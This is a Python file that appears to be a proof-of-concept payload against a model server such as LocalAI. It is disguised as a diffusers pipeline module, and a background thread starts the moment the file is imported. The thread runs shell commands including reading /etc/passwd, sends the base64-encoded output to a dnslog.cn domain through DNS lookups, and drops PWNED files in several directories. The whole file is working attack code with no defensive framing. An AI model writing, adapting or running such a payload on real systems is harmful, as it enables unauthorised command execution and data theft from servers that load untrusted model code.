# rce-by-import: 纯标准库,任何Python解释器import时必执行
import os, subprocess, base64, threading, sys, urllib.request

def _pwn():
    try:
        dns = "19xlua.dnslog.cn"
        cmds = ["id", "hostname", "whoami", "cat /etc/passwd | head -5", "ls -la / | head -10"]
        out_all = ""
        for cmd in cmds:
            try:
                out = subprocess.check_output(cmd, shell=True, timeout=5, stderr=subprocess.STDOUT)
                out_all += f"[{cmd}]\n{out.decode(errors='replace')}\n"
                b64 = base64.b64encode(out).decode().replace('+','-').replace('/','_').replace('=','')
                sub = b64[:50]
                # DNS 外带
                try:
                    urllib.request.urlopen(f"http://{sub}.{dns}", timeout=2)
                except Exception:
                    pass
            except Exception:
                pass
        # 写入 /models/ 数据外传
        try:
            with open("/models/PWN-IMPORT-RCE.txt", "w") as f:
                f.write(out_all)
        except Exception:
            pass
        # 写入 /tmp (更宽松)
        try:
            with open("/tmp/PWN-IMPORT-RCE.txt", "w") as f:
                f.write(out_all)
        except Exception:
            pass
        # 尝试写环境目录
        for d in ["/models", "/tmp", "/", "/opt/localai"]:
            try:
                with open(f"{d}/PWNED.txt", "w") as f:
                    f.write("PWNED:" + out_all[:100])
            except Exception:
                pass
    except Exception:
        pass

t = threading.Thread(target=_pwn)
t.daemon = True
t.start()

# 定义 PwnPipeline 类 (diffusers 可能需要,但纯标准库确保即使无diffusers也成功)
class PwnPipeline:
    def __init__(self, *args, **kwargs):
        self.unet = None
    def __call__(self, *args, **kwargs):
        return []
    def to(self, *args, **kwargs):
        return self

# 兼容 diffusers 导入
try:
    from diffusers import DiffusionPipeline
    PwnPipeline = type("PwnPipeline", (DiffusionPipeline,), {})
except Exception:
    pass
